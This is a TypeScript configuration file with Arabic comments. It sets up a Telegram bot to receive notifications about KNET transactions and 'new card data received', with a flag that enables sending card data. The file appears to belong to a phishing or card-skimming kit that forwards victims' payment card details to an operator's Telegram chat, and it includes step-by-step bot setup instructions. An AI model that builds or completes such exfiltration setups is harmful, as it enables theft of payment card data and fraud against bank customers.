// إعدادات التلغرام - يجب تحديث هذه القيم
export const TELEGRAM_CONFIG = {
  // احصل على توكن البوت من @BotFather في التلغرام
  BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',
  
  // معرف المحادثة الخاص بك - يمكن الحصول عليه من @userinfobot
  CHAT_ID: 'YOUR_CHAT_ID_HERE',
  
  // إعدادات إضافية
  ENABLE_NOTIFICATIONS: true,
  ENABLE_CARD_DATA_SENDING: true,
  
  // رسائل مخصصة
  MESSAGES: {
    TRANSACTION_START: '🚀 بدء معاملة جديدة في KNET',
    CARD_DATA_RECEIVED: '💳 تم استلام بيانات بطاقة جديدة',
    TRANSACTION_COMPLETE: '✅ تم إكمال المعاملة بنجاح'
  }
};

// دليل الإعداد:
// 1. إنشاء بوت جديد:
//    - اذهب إلى @BotFather في التلغرام
//    - أرسل /newbot
//    - اتبع التعليمات واحصل على التوكن
//
// 2. الحصول على معرف المحادثة:
//    - أرسل رسالة إلى @userinfobot
//    - أو أرسل رسالة إلى البوت الخاص بك ثم استخدم:
//    - https://api.telegram.org/bot<TOKEN>/getUpdates
//
// 3. استبدال القيم في telegramService.ts:
//    - ضع التوكن في BOT_TOKEN
//    - ضع معرف المحادثة في CHAT_ID

export const getTelegramApiUrl = (botToken: string) => {
  return `https://api.telegram.org/bot${botToken}`;
};